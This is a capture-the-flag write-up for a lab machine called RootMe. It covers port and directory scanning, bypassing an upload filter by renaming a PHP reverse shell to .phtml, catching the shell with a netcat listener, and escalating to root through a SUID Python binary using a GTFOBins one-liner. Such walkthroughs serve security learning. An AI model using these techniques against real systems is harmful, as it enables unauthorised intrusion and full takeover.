# RootMe


IP - 10.10.88.7

## Scanning and Enumeration
nmap scan:
```
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: HackIT - Home
|_http-server-header: Apache/2.4.29 (Ubuntu)
```
dirsearch:
```
[22:18:58] 403 -   275B - /.php
[22:19:21] 301 -   306B - /css  ->  http://10.10.88.7/css/
[22:19:28] 200 -   616B - /index.php
[22:19:28] 200 -   616B - /index.php/login/
[22:19:30] 200 -   956B - /js/
[22:19:30] 301 -   305B - /js  ->  http://10.10.88.7/js/
[22:19:38] 301 -   308B - /panel  ->  http://10.10.88.7/panel/
[22:19:38] 200 -   732B - /panel/
[22:19:44] 403 -   275B - /server-status
[22:19:44] 403 -   275B - /server-status/
[22:19:50] 301 -   310B - /uploads  ->  http://10.10.88.7/uploads/
[22:19:50] 200 -   741B - /uploads/
```

## Exploit
- http://10.10.88.7/panel is vulnerable to file upload.
- http://10.10.88.7/uploads allows you to see the uploaded files.
- Tested website uploads and found out it allows .txt to be uploaded but .php gets denied.


## Reverse Shell
- In terminal navigate to ``` /usr/share/webshells/php/php-reverse-shell.php ```
- ``` cp php-reverse-shell.php ~/Documents/php_reverse_shell.phtml ``` (copy executable file to "Docuemnts" directory and change the file name to .phtml file).


*The file renamed .phtml to bypass upload restrictions on .php files, allowing us to upload and execute the PHP reverse shell.
![image](https://github.com/user-attachments/assets/b0e1c037-170e-4015-8f3b-68fd40c1035e)

- Upload the executable file in the website and then go to http://10.10.88.7/uploads.
- In the terminal start netcat listener - ``` nc -nlvp 4444 ``` > go back to the website and open the executable file to achieve the reverse shell.

## Post-Exploit
- To find user.txt - ``` find / -iname “user.txt” 2>/dev/null ```


![image](https://github.com/user-attachments/assets/88ea8174-23d7-4b2c-8e80-95ead92d3539)


# Priviledge Escalation
Found interesting file with SUID permissions that will allow priviledge escalation by typing - ``` find / -user root -perm -4000 2>/dev/null ```

reference - https://docs.oracle.com/cd/E19683-01/816-4883/6mb2joatb/index.html

![image](https://github.com/user-attachments/assets/40b3717f-6816-4dac-8153-f76aa1866927)

Escalated priviledges to be root user by typing - ``` ./usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")' ```

reference - https://gtfobins.github.io/gtfobins/python/

-> All is left to do is cd into root and cat the file.

